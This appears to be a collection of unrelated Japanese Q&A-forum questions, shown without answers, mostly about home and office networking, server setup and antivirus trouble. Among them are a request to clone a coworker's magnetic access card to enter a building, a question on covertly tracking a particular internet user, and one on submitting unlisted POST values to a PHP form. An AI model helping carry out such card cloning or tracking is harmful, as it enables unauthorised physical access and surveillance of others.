また、同じネットワーク内にある全てのデバイスのIP、動作状況をコマンドプロンプトから調べるようなネットワークコマンドがあれば教えて下さい。 このときのＡＰのＩＰを調べる方法ってあるのでしょうか。 以上、宜しくお願いします。 ================================================================= モデム--------------ルーター~~~~~~~~~~PC-A 　　　　　　　　 　　　 ｜~~~~~~~~~~~~PC-B　　 　 　　　　　　　　　　 ｜~~~~~~~~~~~~PC-C 　　　　 　　　　　　　　 ｜~~~~~~~~~~~~AP--------------------プリンター 　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　 |--------------------レコーダー
デスクトップパソコンにAtermWR8700N（HPモデル）が繋がりません。 先日、友人にデスクトップパソコン(vista)を譲ってもらったのですが、ＬＡＮケーブルが距離があって繋げないので無線LANを繋ごうと試みたのですが、パソコンの「ネットワーク接続の管理」で「ワイヤレスネットワーク接続」が表示されません。 スマートフォンで確認したら、きちんと電波は飛んでいます。 この場合、子機(USB？)というものを買えば繋げることができますか？ それとも買わなくても繋げることができますか？ また、買うとしたら相性の問題でこれじゃないとダメ、等ありますか？ お願いしますm(_ _)m
首記の話があるようだがこれは事実か、事実としたらその影響は莫大では？
日本電気PC９８の頃はHDD等の予備領域をユーザが普通に見る手法は存在したようだがAT互換機以降はなくなったのはどうして？やはり何かNSAとか意図されたものがあるのか？
Windowsサーバから、UNIXサーバにFTPでファイル取得しようとすると、エラーがでてすすみません。 コマンドプロンプトで　対話的に動かす分には問題なく動作するのですが、バッチで動かすと エラーがでてしまうのです。 動かそうとしているバッチファイルとその読み込みスクリプトは以下です。 （変数部分はぼかしています） ==== myftp.bat BGN ==== set dirname=%DATE:/=% mkdir D:\master\%dirname% ftp -s:ftpcmd.txt ==== myftp.bat END ==== ==== ftpcmd.txt BGN ==== open hoge user_naem pass_word bin lcd D:\master get file.txt quit ==== ftpcmd.txt END ==== これらを動かすと、 スクリプト ファイル ftpcmd.txt を開くときにエラーが発生しました。 というエラーがでて前に進みません。 対話ベースでは、ftpcmt.txt ファイルの内容をコピペして、きちんと動くので、 何が原因がわかりかねています。 どなたか知恵を貸してください。
WEB問い合わせフォームの暗号化について調べているのですが、 問い合わせフォームだけSSLにしても、確認メールなどもなんとかしないと意味がないという記事をネットで見かけました。 一般的に、問い合わせフォームの暗号化などをちゃんとしているところは、問い合わせフォームの入力～確認メールを、どのような形で作られているのでしょうか。 よろしくお願いします。
素人なので、詳しくまでに説明できませんが、画像添付で宜しくお願いいたします。
http://tocana.jp/2014/07/post_4475_entry_2.html この記事の１３行目にある“とある方法”とは何ですか？ 単純にAnonymousProxyサーバーのことでしょうか？
お世話になっております。 BIND9.9.2で試験用にDNSを構築しようとしています。 Windows系のPC２台を使って、 pc1.example pc2.example というドメインを作りました。 各PCの中で、自分自身の名前解決はできているようなのでが、 相互に名前解決させることができません。 例えば、 pc1から dig @127.0.0.1 pc1.exampleと打てば、 ;; AUTHORITY SECTION: pc1.example. 3600 IN NS pc1.example. と返ってくるのですが、 dig @127.0.0.1 pc2.exampleとやっても、 ;; ANSWER SECTION:以降が出てきません。 Windowsファイアウォールでは、TCP/UDPの53は開けてあります。 解決のヒントなどをいただけるとありがたいです。 named.confの設定は以下のとおりです。 options { directory "C:\windows\SysWOW64\dns\etc"; allow-query{ 127.0.0.1; 192.168.95.11;←pc1のアドレス 192.168.98.12;←pc2のアドレス }; recursion yes; forwarders{ 192.168.98.12; ←pc2のアドレス }; }; zone "." { type hint; file "named.root"; }; //include "named.special.zones"; zone "localhost" { type master; file "localhost/fwd"; allow-update { none; }; }; zone "0.0.127.in-addr.arpa" { type master; file "localhost/rev"; allow-update { none; }; }; zone "pc1.example" { type master; file "pc1/fwd"; allow-update { none; }; }; zone "11.95.168.192.in-addr.arpa" { type master; file "pc1/rev"; allow-update { none; }; }; よろしくお願いします。
お世話になります。 SMTPのリレー動作について伺います。 試行的に内部LAN内で２台のSMTPを構築しました。 PC（Windows7）２台それぞれに、Xmail-1.27をインストールしています。 ドメイン名は各々test.mail.comとxmail.sv　として、 お互いにDNSを使った名前解決はできず、hostsを使っています。 メーラとしてoutlookを使い、 test.mail.comユーザからxmail.svユーザにメールを送信すると、 問題なくメールが届きます。 特段リレーサーバの設定をしていないのですが、 test.mai..comはどうやってxmail.svにリレーしているのでしょうか？ 実は、リレーサーバとして相手ホストを設定すると、 逆に転送しなくなってしまったりします。 先ずは、SMTPの基本動作を理解する必要があり、自ホストにユーザがいない場合には、 次のメール転送先をどうやって決めているのかを教えていただきたいと思います。 よろしくお願いします。
OS: Window8.1 ProのノートPC にて無線LAN接続ができない場合とできる場合があります。 自宅の無線LAN環境では問題なく接続できます。 同じノートPCをホテルに持って行った時、無線LANに接続できませんでした。 状況としては、 1. ホテルの無線LANのアクセスポイントは表示される。 2. そのアクセスポイントを選択しても、暗号化キーなどを入れる画面が表示されない。 3. 同じホテルでほぼ同時刻にて、別の人のWindows7 ProのノートPCでは、暗号化キー入力画面が表示され、キーを入力して無線LAN接続ができた。 つながらないWin8.1PCにて、どのような設定部分を見ていくのが良いのでしょうか?
お世話になります。 私の勤務しているビルは出勤する際、磁気カードリーダーを使ってビルに入るのですが、 その磁気部分が読み込みできなくて毎朝、同僚がくるのを待って一緒にビルに入ります。 磁気カードの読み込みエラーはもう三度目なので、会社に言うと始末書を書かなければ なりませんし賞与にも影響しますので、自分で解決しようと思います。 同僚の磁気カードを借りて複製品を作りたいのですが、可能でしょうか？ また、どうゆう製品を買えばいいのでしょうか？ その磁気カードには、社員のIDなどは書かれていないと思いますが、ビルに入居している たくさんの会社名、または部屋番号程度が書かれていると推測します。 詳しい方がいましたら、ご教授の程、宜しくお願い致します。
HUBを使用し、インターネットに接続しようとしたのですが出来ませんでした。 サーバーとHUBをケーブルで繋いだだけでは接続出来ませんよね？ やりたいこととしては、WEBサイトを作成したのでアップしたい。 IISで、IIS>servername>webサイト名と展開していき、「参照」をクリックすると見る事は出来ます。 ただ、ブラウザを起動すると、「ページが見つかりません」となり表示できません。 ブラウザを起動して、アドレスバーにアドレスを入力してサイトを表示させたい。 また、DNSサーバーを建てたのですが、他に何をしたらよいか教えてください。 よろしくお願いいたします。
ウイルスバスター2012　保険付きＣＤロムを買ってまだ期限までまだまだあるというのに 突然ウイルスバスターが機能しなくなりました。 画面からアイコンも消えてしまっていて、で探して何度もクリックしても反応なし。 なんにかウイルスにやられているのでしょうか？ トレンドマイクロのＨＰにいくと、シリアル番号がわからないと受付ないようでどうすることもできません。、 なぜかさがしても肝心のものがでてこないのです。 ＰＣには入っているのですが、どうすればシリアル番号を調べることができるのでしょうか？ もうあきらめるしかないのでしょうか？ そのせいか、今ウイルスにやられてしまう状態なのでしょうか？ もう泣きそうです。どうかよろしくお願いします。
なぜ有線だと速度制限がないのに、 無線で契約すると7GBなどの制限がされるのですか？ 良くわからないんですがおしえてください
僕は今まで、データ通信のきつい7GB制限に苦しめられ wimaxなどのいろんなことを試してきました。 ただ、僕が欲しい十分な速度は出ませんでした。 僕がいま究極にほしいのは、オンラインゲームや動画をみたりなんかをしても快適で、無制限に、どこでもインターネットを使える環境です。 そして、それをできるのは自作しかないと思ったのです。 そこで質問です。 果たしてそんなことはできるのでしょうか。 できない理由、できる方法をおしえてください。
スマートフォンやモバイルルーターでは通信に 7GB制限や月額が存在しますよね。 通信は携帯なんかの端末からでた電波を基地局で拾って 有線で他の基地局へ情報を運び、他の端末へ届けると聞きました。 では、そのどこで必要な費用を月額などで払わされているのですか？ また、なぜひつようなんですか？ 良くわからないんですが教えてください。
良くわからないんですがWiMAXっていうのは 無線で情報を受け取って無線で端末に繋ぐじゃないですか。 電話回線を使って無線で端末に繋ぐルーターや 無線で情報をいきなり端末に飛ばすdocomoなどの通信サービス(?)と同じ速度が出るのはなぜですか？
間違えてエロ動画サイトみたいなのをクリックしてしまい、そしたらいきなり入会しましたという画面になりました。びっくりしたのでその画面は消してしまったのですが、請求とか来るのでしょうか？そのままほっといても大丈夫ですか？
メールでAESですでに暗号化された文がメールにそのまま書かれて送られてきました。 この文をターミナルで復号したいのですが、テキストエディットでどのような形式で保存をすれば、復号することができますか？ 保存する名前の末尾がascにならないといけないと思うのですが、.ascを付け足すだけではだめでした。 パズワードはわかっています。
はじめまして今21で短大卒で就活をしています。 将来的にはセキュリティエンジニアになりたいと思っています。 どういった職業についたらセキュリティエンジニアになりやすいですか？ 例えばSEをやりつつ情報セキュリティなどの資格を取得して、転職する。 といった感じでいいのでしょうか？ 言語はCとjavaの初歩はできます。 回答お願いします。
今回、SanDisk SSD UltraPlus 256GB を購入しまして、自分のパソコンのHDD1TBのCドライブの方でクローンをSSDに作成して起動しようかと思ったのですが、 容量が足りなくて出来ないと表示されます。 今回自分はCドライブが使用容量が120GB で全然SSDの容量に足りるんですけどクローンできなくて困ってます。 1TBのHDDは、3つのパーティーションで分割しております。 CドライブのみをSSDに移植したいです。 いろいろファイルなどを消したのですがやはりできないです。 この場合はどうすればいいですか？ 256gbではなく1TBのSSDを購入すべきですか？ 使用したフリーソフトは、EaseUS Todo Backup Free OS Windows 7 64bit home… CPU i54670k HDD シーゲート1TB
まだ先のことで、お問い合わせ先がないので、こちらで質問というか意見をもらいにきました。 以下内容 斬新なSNSや、P2Pに関するアイデアは沢山あるが、技術力がない人はどうしたらいいでしょうか？ 私は、興味はあってもプログラムやIT技術がありません。 あるとすれば、photoshopやillustratorを駆使した写真加工、キャラ制作、Webデザイン また、ブラウザや各アプリを立ち上げたりFlashPlayer(youtubeや各real-streaming)を見たり動かしたりしてても全てのIP通信は匿名で、隠せる程度です。 でも、それはセキュリティの知識や関連サービスとフリーソフトの操作を我武者羅に弄り倒したら偶然って感じで、先ほど述べたように開発技術があるわけではないのです。。
ＤＯＳ攻撃されたら自動でそのＩＰアドレスを遮断するのは可能でしょうか？ あるのでしたら、その方法はどうするのでしょうか？ もしくは、 なんらかのサーバー管理ソフト等でもかまいません。 無料でさがしているのですが、 有料サービスでも教えてください。
ポートスキャンされたら自動でそのＩＰアドレスを遮断するのは可能でしょうか？ あるのでしたら、その方法はどうするのでしょうか？ もしくは、 なんらかのサーバー管理ソフト等でもかまいません。 無料でさがしているのですが、 有料サービスでも教えてください。
ポートスキャンされたらメールで知らせてくれる様にしたいのですが、 （snortも有料らしいです。 ） 有料ので構いませんので、良い商品をご紹介下さい。 （日本語等のマニュアルがあるとうれしいです） ちなみに英語でわからないのですが、snortの有料版は、 http://www.snort.org/vrt/buy-a-subscription 年間、29.99ドルと思ってよいのですか？ VRTとは何でしょうか？ Sensor センサ（複数可）とはなんでしょうか？ ルールファイルが一つしか使えないという事でしょうか？
　今日は、ネットワークの初心者です、よろしくお願いします。 　ipconfigというコマンドで自分のipを調べると、以下のように表示されました。 　1.Wireless LAN adapter ローカル エリア接続* 2: 　2.イーサネット アダプター ローカル エリア接続: 　3.Wireless LAN adapter Wi-Fi: 　4.イーサネット アダプター イーサネット: 　PCのip構成は、ケーブル接続、無線接続だけと思っていたのですが、 それぞれの役割とはどのようなものでどのように違うのでしょうか。 　また、この内容はPCによって変わるものなのでしょうか。 　他のPCでは、２個程度のアダプタしかなかったような気がしますが。 ===================================================================== Windows IP 構成 ホスト名. . . . . . . . . . . . . . .: PC プライマリ DNS サフィックス . . . . .: ノード タイプ . . . . . . . . . . . .: ハイブリッド IP ルーティング有効 . . . . . . . . .: いいえ WINS プロキシ有効 . . . . . . . . . .: いいえ Wireless LAN adapter ローカル エリア接続* 2: メディアの状態. . . . . . . . . . . .: メディアは接続されていません 接続固有の DNS サフィックス . . . . .: 説明. . . . . . . . . . . . . . . . .: Microsoft Wi-Fi Direct Virtual Adapter 物理アドレス. . . . . . . . . . . . .: **-**-**-**-**-** DHCP 有効 . . . . . . . . . . . . . .: はい 自動構成有効. . . . . . . . . . . . .: はい イーサネット アダプター ローカル エリア接続: メディアの状態. . . . . . . . . . . .: メディアは接続されていません 接続固有の DNS サフィックス . . . . .: 説明. . . . . . . . . . . . . . . . .: Intel(R) Centrino(R) WiMAX 6250 物理アドレス. . . . . . . . . . . . .: **-**-**-**-**-** DHCP 有効 . . . . . . . . . . . . . .: はい 自動構成有効. . . . . . . . . . . . .: はい Wireless LAN adapter Wi-Fi: メディアの状態. . . . . . . . . . . .: メディアは接続されていません 接続固有の DNS サフィックス . . . . .: 説明. . . . . . . . . . . . . . . . .: Intel(R) Centrino(R) Advanced-N 6250 AGN 物理アドレス. . . . . . . . . . . . .: **-**-**-**-**-** DHCP 有効 . . . . . . . . . . . . . .: はい 自動構成有効. . . . . . . . . . . . .: はい イーサネット アダプター イーサネット: メディアの状態. . . . . . . . . . . .: メディアは接続されていません 接続固有の DNS サフィックス . . . . .: 説明. . . . . . . . . . . . . . . . .: Intel(R) 82579LM Gigabit Network Connection 物理アドレス. . . . . . . . . . . . .: **-**-**-**-**-** DHCP 有効 . . . . . . . . . . . . . .: はい 自動構成有効. . . . . . . . . . . . .: はい
htaccessのエラーについての質問です。 リダイレクトを以下のように設定して正常に動作しています。 RewriteEngine On RewriteBase / RewriteRule ^◯◯◯◯◯◯◯$ /◯◯◯◯◯◯◯ [R=301,L] これにキャッシュコント―ロールのため、 以下のコードを追加したところ <Files ~ "\.(pdf|png|jpg|gif)$"> Header set Cache-Control no-cache Header set Pragma no-cache </Files> Internal Server Error になってしまいました。 文字コードや不要な空白などのミスは無いように思うのですが、 htaccessの内容によってエラーの発生は起こるのでしょうか？
Cisco Catalyst4507スイッチにて、下記のように包含関係にあるサブネットに IPを設定したい場合、どのようにしたら設定できるのでしょうか？ interface vlan 10 ip address 192.168.0.1 255.255.0.0 interface vlan 20 ip address 192.168.20.1 255.255.255.0 interface vlan 10を設定した後に、interface vlan 20に上記の IPを設定しようとすると、エラーメッセージが出てうまく設定できません。 エラーメッセージは「interface vlan 10 のネットワークとサブネット 範囲が重複しているため設定できません」といった内容でした。 何かしらの設定方法があるのか、それとも、そもそもこのような設定が できないものなのか、ご教授いただければと思います。 よろしくお願いします。
先日、softbank BB 販売代理店の方が来て、IPv4のアドレスが枯渇してIPv6への対応をしないといけないという旨のことを説明しにきました。プロパイダを乗り換えないといけないと言われ、流されてyahoobbにサインをしてしまいました。しかし、後から考えると今困ってるわけでもないし、使用中のプロパイダも対応していくと言っているので、本当に乗り換える必要はあったのかと疑問が出てきました。 使用中のプロパイダも契約時に期間を決めて料金体制を組んでいるので、解約となれば解約金などが発生しますし、正直乗り換えたくありません。 本当にsonetからyahoobbに乗り換える必要はあるのでしょうか？ また、yahoobbの契約を切ることはできるでしょうか？ 結構困っています。 現在私が使っているプロパイダはso-netです。
現在、Webサイトを作成しているのですが、その際に「https→http」へ遷移させるために、SSLの設定を行っています。環境はWindows 2000です。 下記のサイトを参考に証明書サービスでサーバー証明書を発行しようとするのですが、証明書サービスをインストールする際に『ファイルをコピーできませんでした』となりインストールできませんでした。 しかし、『コピーできませんでした』をキャンセルしていくと何故か分かりませんがインストールできました。 また、「すべてのプログラム」-「認証局」は表示されません。そもそも、「すべてのプログラム」がありません。 また、この方法だと、ファイルを保存できても、「http://localhost/certsrv/」にアクセスできません。 私のやり方がおかしいのかもしれませんが、上手くいきません。 この方法にこだわっていないので、何か他の方法でSSLの設定、証明書の発行が行えるやり方を教えてください。 http://www.atmarkit.co.jp/fwin2k/win2ktips/919se … http://www.atmarkit.co.jp/fwin2k/win2ktips/920ii …
以前まで接続出来ていたネットが接続出来なくなりました。DNSサーバーが応答していませんとでます。(パソコン初心者です。) 詳細書きます。 以前、ネットを繋ぎました。プロバイダー(？)は プララです。以前から、ネットをつなぐ時はパソコンを起動して右下のネットワークのところをプララに合わせてからインターネットをしていました。知り合い曰く、他のサーバーを経由しているっぽかったのでプララを毎回選択して接続していました。 今回、ウイルスを消すためにパソコンを初期化しました。すると、その右下のネットワーク接続のところでプララを選択してもネットが繋がらなくなりました。おそらく、もう一つのところに接続になっていると思います。以前は知り合いがいろいろ(別のプロバイダーみたいなのを何個か削除して、プララを残すという方法)してくれてたのですが、また同じようなことで呼ぶのは申し訳ないと思ったので、質問しました。 ルーターのコンセントなどは抜いたり差したりしました。 本当にパソコン初心者なので、何か返答お願いします。
rima-tde.netからスパムメールが来るのでIPアドレスを調べたいと思い、pingやnslookupコマンドで確認したのですが、調べることができませんでした。 以下、質問です。 1. IPアドレスを確認する方法はありますでしょうか？ 2.　どうすれば、同じことができますでしょうか？ よろしくお願いします。
サイトに色々誹謗中傷等書かれ、書き込みのIPアドレスのみ分かっているので今後の対応について色々調べております。 固体情報が分かれば簡単に特定出来るようですが、今回はIPアドレスしか分かってないので…。 IPから個人の特定において、自宅などのパソコンからアクセスした場合は、固定の場合はもちろんですが、動的IPにおいてもなかなかIPの変更はないので、捜査機関等からの照会があれば、プロバイダが保存しているログと照合し、そのIPと契約者情報から個人の特定が可能とありました。 では、携帯キャリアからアクセスの場合は、ほぼ毎回アクセスするたびにIPが変わっていても個人の特定は可能なのでしょうか。 ほぼ毎回IPが変わるということは、その全てのログをプロバイダは保存しなくてはならなくなり、データも膨大になりますので、そこまでしていただけるのかなぁっと思いました。 どなたか詳しい方、よろしくお願いします。
このWedサイトは、'Adobe Systetems Incorporated'からの 'Adobe Flashruntime' アドオンをインスト－ルしょうとしています。 危険性の説明（W)　　　　　　　　　　　　　　　　　　インスト－ル（I） 上記のように表示され、困っています。 解決策を教えて下さい。
http://www.avira-japan.jp/ http://www.avira-japan.jp/law/ Ａｖｉｒａという、セキュリティーソフトですが、アメリカのサイトにてフリーのソフトをダウンロードした折　入り込んだようです。 （通常、その日のうちに　今日インストールされたソフトは削除するのですが、漏れたようです） セットされている期限が来たようで、ＩＥの　トップページに　そのソフトのサーチのページが http://avira.search.ask.com/?tpid=AVIRA-V7&o=APN … 居座ったままです。ＩＥのオプション設定のホームページも無視されます。 前回のセッションは　グレーです、選択不可。 本来のセキュリティーソフトも　情報ファイルが無い　で　機能しなくなったようです。 コンパネ、ソフトの削除も　情報ファイルがない　エラーをだして、削除できません。 エクサゴン社のＨＰでは　体験版の質問不可、フォーラムで。となってますが、そのフォーラムもどこにあるのか？？ で、恐縮ですが コンパネから削除できない　ソフトを　削除する方法は？ ＩＥのトップページ　を変える方法は？ 如何でしょうか。よろしくどうぞ
　今日は、ネットワーク初心者です。宜しくお願いします。 　あるネットワーク関係の参考書に「MACアドレスは変えることができる」と書いてありました。 　MACアドレスは一意のユニークなものと思っていたのですが、この意味は、悪意を持って 　それなりのネットワークの技術を持っている者であれば変更（偽装）することも可能であると いう意味でしょうか。
セキュリティーについて興味が出てきて、 パケット警察　というソフトをダウンロードしてみたのですが、 http://www2.softether.jp/jp/packetpolice/downloa … にある、説明と少し違う会社の署名がされています。 具体的には「SoftEther Corporation」ではなく、「SoftEther K.K.」です。 これは改ざんがされているのでしょうか？それとも、こちらも正しい表記なのでしょうか？ また、今まで署名という物は気にしたことがなかったのですが、これが改ざんされているか否かを個人で簡単に調べる方法はありますか？ また、この署名の名称（SoftEther Corporation）は世界で唯一のユニークな文字列なのでしょうか？仮に、ただの名前であれば簡単に偽造できそうですし・・・
パソコンにLANポートが二つありますが、ping 192.168.1.1を入力した時どっちのLANを見に行ってるんでしょうか。 二つのLANともに192.168.1.1というホストがあったら、どうなるんでしょうか。お願いします。
共通鍵・公開鍵・秘密鍵の鍵とは要は「１２３ＫＪＮＩＤｌｌｌ・・・」などの数字や文字のパスワードのことでしょうか？ 例えば、共通鍵暗号方式では、ファイル・テキストなどのパスワードを「１２３ｇｈ」などと設定して、 それを送信者と受信者でパスワードの情報を共有するのでしょうか？ 公開鍵暗号方式も同様にファイル・テキストに「１２３yu」は公開鍵、「４５６ghjは秘密鍵と設定をするのでしょうか？
　今晩は、NASについて質問致します。 　今日SHOPに行くとWifiでつながるNAS構成が可能なHDDがありました。 　更に（家庭）外からもアクセスできるルータ機能も　あると書かれていました。 　家庭内では（プロバイダー接続の場合には）ゲートウエイがDHCPとかルータ機能を もっており、各PCはローカルIPで認識されると思うのですが、NASを構成した場合には どのようにして、外部からNASのHDDにアクセスすることができるのでしょうか。
一年以上前に買った富士通のWindows７のノートパソコンなのですが ウイルス対策の仕方もよくわからず何も考えずに使用していました。 三ヶ月くらいウイルスソフトをいれていない時期がありました。 そして今入れてあるウイルスソフトはウイルスバスタークラウドというものですがもうじき期限が切れてしまうという状態です。 現在pcが異常なほど重くなってしまいさらにエクスプローラを開くとネットが全て文字化けしてしまい全く読めません。 友達に初期化した方が良いといわれたのですが初期化するにあったてウイルスソフトの設定や データの移転はどのように行えば良いのでしょうか？ pcを元通りにつかえるようになりたいです、、 pcはよくわからないので詳しく教えていただけると助かります。 宜しくお願いします。
友達とのゲームで あるWebページに隠されたある文字列を探しています。 隠されているウェブページは .phpというhtmlでメソッドpostした先のウェブページです。 htmlソースにはある文字列(答えの文字列)はありませんでした。 可能性として文字列が隠されているであろうところはどこがあるでしょうか？ htmlソースしか思い浮かびませんでした。
IEが何ヶ月も前から開けない状態です。IEも開いてもすぐに終了させられてしまいます。IE9です。使っているパソコンはvistaでもう7年使っています。寿命で壊れているのならいいのですがウイルスなのか心配です。使ってるウイルスソフトはマイクロソフトの無料のやつです。それではなにも検出されませんでした。ウインドウズアップデートもしています。IEの初期化もしてみたのですがダメでした。 問題が発生したためプログラムが正しく動作しなくなりました。プログラムは閉じられ、解決策がある場合はウインドウズから通知されます。とでます。 コントロールパネルから解決策を見るを押してみても解決策がないとなります 故障なのかウイルスなのかどうなんでしょうか、、、 iTunesだったりチョロメ？とかは普通に使えるのですが、、、
.pcapファイルをテキストファイルとして表示したいです。 .pcapファイルを開けるアプリケーションがなく.pcapファイルは手元にあります。 インストールするソフトとやり方を教えてください。 OSはwindows7 と CentOSがあります。 どちらでも構いません。教えてください
とある端末がハングしました。 端末担当者は原因デバッグも満足にできないクセに言うに事欠いて調度同時期私が導入したVRRPのせいにされました。 すったもんだありACLでその端末にだけVRRPが行かないようにしてくれと頼まれましたがやり方がわかりません。特定の端末宛てとした時点でユニキャストを記述することにになっちゃいません？
ＲＴＸ１０００を使ってリモートアクセス（ＰＰＴＰ）接続後、同一ネットワーク内の共有ファイル（192.168.100.50）にアクセスする設定が、うまくいきません。現状では端末からルータまでpingが○、なのですが、端末→共有ファイルにpingが×状態です。 フィルタかとおもい全部のフィルタ記述を削除したのですが、変化ありませんでした。 ルータまでＲＡＳ接続が確認できるのですが、ルータより先にネットワークが疎通しない状態です。 ---構成----- ルータ　192.168.100.1 共有　 192.168.100.50(NAS) 端末　　192.168.100.121(接続後ＤＨＣＰ)　ＲＡＳ接続 拠点Ｂ　192.168.11.0/24（接続確認済） ----コンフィグ--------- ip route default gateway pp 1 ip route 192.168.11.0/24 gateway tunnel 1 ip lan1 address 192.168.100.1/24 pp select 1 pp always-on on pppoe use lan2 pppoe auto disconnect off pp auth accept pap chap pp auth myname 名前　パス ppp lcp mru on 1454 ppp ipcp ipaddress on ppp ipcp msext on ppp ccp type none ip pp mtu 1454 ip pp nat descriptor 1 netvolante-dns use pp auto netvolante-dns hostname host pp 名前.aa0.netvolante.jp pp enable 1 pp select anonymous pp name RAS/VPN: pp bind tunnel3 pp auth request mschap-v2 pp auth username 名前 パス ppp ipcp ipaddress on ppp ccp type mppe-any ip pp remote address pool 192.168.100.121-192.168.100.135 pptp service type server pp enable anonymous tunnel select 1 ipsec tunnel 1 ipsec sa policy 1 1 esp 3des-cbc sha-hmac ipsec ike keepalive use 1 on ipsec ike local address 1 192.168.100.1 ipsec ike pre-shared-key 1 text aaaaaaaa ipsec ike remote address 1 固定IP tunnel enable 1 tunnel select 3 tunnel encapsulation pptp pptp tunnel disconnect time off tunnel enable 3 nat descriptor type 1 masquerade nat descriptor address outer 1 ipcp nat descriptor address inner 1 auto nat descriptor masquerade static 1 1 192.168.100.1 tcp 1723 nat descriptor masquerade static 1 2 192.168.100.1 gre nat descriptor masquerade static 1 3 192.168.100.1 udp * nat descriptor masquerade static 1 4 192.168.100.1 tcp www nat descriptor masquerade static 1 5 192.168.100.1 tcp telnet nat descriptor masquerade static 1 6 192.168.100.1 esp ipsec auto refresh on syslog debug on dhcp service server dhcp server rfc2131 compliant except remain-silent dhcp scope 1 192.168.100.80-192.168.100.99/24 dns server ＤＮＳ-ＩＰ pptp service on 末筆で恐縮ですが、ご教授いただけると幸いです。 よろしくお願いします。
インターネットを見ていると、ここ最近「このページのスクリプトでエラーが発生しました」 といった表示が出続けて困っています。他の質問もいくつか見たんですが、どれも『IE』についてのものばかりでした。しかし私が使っているのは『chrome』です。どなたか解決方法を教えていただけないでしょうか？ちなみに、『chrome』についての知識もあまりありません＾＾；　よろしくお願いします
今日、中古品を売っているお店でNECのAterm　WR6650Sの無線ルータを購入しました。 パソコンで無線ＬＡＮの設定をしてたんですけど（パソコンは、有線で接続）、暗号化でWEPにして、設定を押すと勝手に暗号無効化になってしまうんです。 何か原因があるのでしょうか？ 詳しい方、解決法を教えてください。 電波泥棒されるのは、嫌です。
「逆引きホスト名」を表示させないようにすることは出来るでしょうか？ http://www.aguse.jp/ ＞DNSに登録がない場合などは表示されません ・どういう意味でしょうか？ ・登録を外すことは出来る？ ・どうやって？ ・外すことによるデメリットってある？ ■「逆引きホスト名」は？ ・普通は表示されるものなのでしょうか？ ・IPアドレスみたいなもの？ ・気にする必要はない？ ■環境 ・さくらVPS
クエリ文字の送信仕方を教えてください。 あるウェブブラウザ(.php)にテキストボックスがあります。 そこには、４つ"a","b""c","d"の選択があります。 このメッソッドはhtmlで、アクションはPOSTです。 ここで質問です。 選択肢は４つですが、５つめの"c"をウェブブラウザにクエリ文字として、送信し、表示させるためにはどうすれば良いでしょうか？ postなのでURLにクエリはつけられないような気がして、 telnetを用いてPOSTすればよいかと思ったのですが、cgiではなくphpでよくわかりません。 ちなみに、セキュリティだったり攻撃をしようとしているわけではありません。 プロフェッショナルな人教えてください
無線ＬＡＮでインターネットをしていたのですが、マンションの定期電気点検で停電になり、無線ＬＡＮルータの電源も落ちたみたいで、停電以降無線ＬＡＮでのネット接続ができなくなりました。 無線ＬＡＮのルータからパソコンまでの受信は問題ないみたいです。 ネットワークの状況を確認するとインターネット接続が「×」になっているので接続ができていない状態です。 「インターネットに接続可能なDHCPサーバー、もしくはPPPoEサーバーが見つかりませんでした。」 というメッセージがでます。 これを解消する方法がわからなく、解決方法を教えて頂けたらと思います。 ルータと子機ともにＢＵＦＦＡＬＯ製です。 有線ではネットができるのでルータとセットの接続ができていない状態だと思われます。 どこかの設定がおかしいのでしょうか？ ルータやパソコンなど再起動などしたりしています。 よろしくお願いします。
以下リンク参照ください。 http://oshiete.goo.ne.jp/qa/3001516.html 1)その人物に高度な技術と利用できる資材があると仮定し、アクセス解析などを元に、個人が（自分のＨＰ・リンク元以外での）特定のネットユーザーの行動を長期間監視・追跡・特定することが技術上可能ですか。 2)可能な場合、グローバルＩＰ固定（または常時接続）に限られますか。 3)対象になりうる行動の範囲（サーフィン履歴・コメント・ショップ利用・検索など）を教えてください。 4)グローバルＩＰ変更で対応できますか。 5)プロバイダ関係者ではない（例えば情報技術関係）を仮定した場合に、この行為自体は、（立場・技術・情報利用などの点で）違法ですか。
いつも勉強させていただいております。 FTP接続は通信が平文で危険ですので ・SFTP ・FTPS で暗号化する方式 ・IP制限 で接続元を制限する といった接続方法を多く利用されておりますが IP制限のみ場合は、サイトの改ざんやアタックなどの侵入の防御には有用と思いますが 送信元と送信先の間の通信は平文でやりとりされるので 傍受されてデータが盗まれてしまう可能性は依然として残る気がします。 傍受された時のことまで考えるなら、結局SFTPやFTPSを利用しないと意味がないと思うのですがいかがでしょうか？ よろしくお願いします。
ツイッターというSNSを利用しているんですが、 ツイッターでは鍵をかけておりフォロワーさんしか私のツイートを閲覧することはできません しかし1ヶ月ほど前、私がアルバイトをしている最中に私のアカウントにアクセスして勝手に書き込みをした人物がいました。 それに気づいたのはアルバイトが終わった後でした。 ツイッターを見たら見覚えのない言葉がツイートしてありました。 不正アクセスだと思い色々な人に対して疑いました。 犯人は元彼でした。 元彼を問い詰めた所、「自分でやりパスワードも知っていたと」メールで言われました。 そのメールも、書き込まれたツイートも残っています。 結果的には元彼を逮捕して欲しいんですが、警察がしっかり取り合ってもらえるか心配です。 逮捕は可能でしょうか? お願い致します。
現在DDNSにて外部から宅内の機器へアクセスを受け付けております。 本来ポートフォワーディングにて簡単にできる設定ですが、LAN内に設定している機器のポート番号が80番から変更するのは一さか面倒なので戸惑っております。 したいこと： 外からhttp://gaibu.ddo.jp:1234 へアクセスした場合、 LAN内の機器のhttp://192.168.0.200:80へアクセスするようにしたいと思っております。 使用しているルーターの機種は、Aterm BL190HWになります。 http://www.au.kddi.com/support/internet/guide/mo … 上記ルーターを使用してできるものでしょうか？ または、Windows XP/7/8に付属の機能を使用して行えるものでしょうか？ 内部機器のポートを80番から他のポートへ変更はできるのですが、自分が物理的にそこへ行けなくてはいけないのと、なぜかたまに勝手にリセットがかかり、ポート番号が80番へ戻ってしまうため上記方法で解決できるか教えて頂きたいと思っております。 ネットワークの基礎的な部分かもしれませんが、ご教授お願いします。
NTT　　　　　　光電話ルーター　PR-400NE バッファロー　WZR-HP-G301NH（無線LAN） 上記ルータ同士の比較です。 A：NTTルータに直に有線LANを接続しネットサーフィンをする B：NTTルータにバッファロールーターを有線接続し無線LAN接続しネットサーフィンする 上記　「　A　VS　B　」の場合、普通に考えるとAの方が速いと考えていたのですが なぜでしょうか？圧倒的に「B」の方が速いのです！ 体感ではありますが、数倍速く感じます。 この理由について、お分かりの方、ご教授ねがえませんでしょうか？ どうぞよろしくお願いします。
